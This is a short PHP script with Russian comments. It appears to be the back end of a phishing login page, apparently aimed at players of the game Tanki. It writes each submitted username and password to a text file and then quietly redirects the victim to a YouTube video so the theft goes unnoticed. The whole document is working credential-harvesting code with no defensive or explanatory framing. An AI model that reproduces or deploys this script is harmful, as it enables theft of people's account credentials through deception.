<?PHP
//**Private-Skripts**\\
//**Скриптик**\\
$Log = $_POST['login'];
$Pass = $_POST['tere'];
$log = fopen("Tanki.txt","at");//тут короче название куда будут сохрянться
fwrite($log,"$Log:$Pass\n");
fclose($log);
echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=https://www.youtube.com/watch?v=cnGMG798SCI'></head></html>";//ТУТ КУДА ПЕРЕНАПРАВЛЯЕМ ПОСЛЕ ВХОДА!
?>
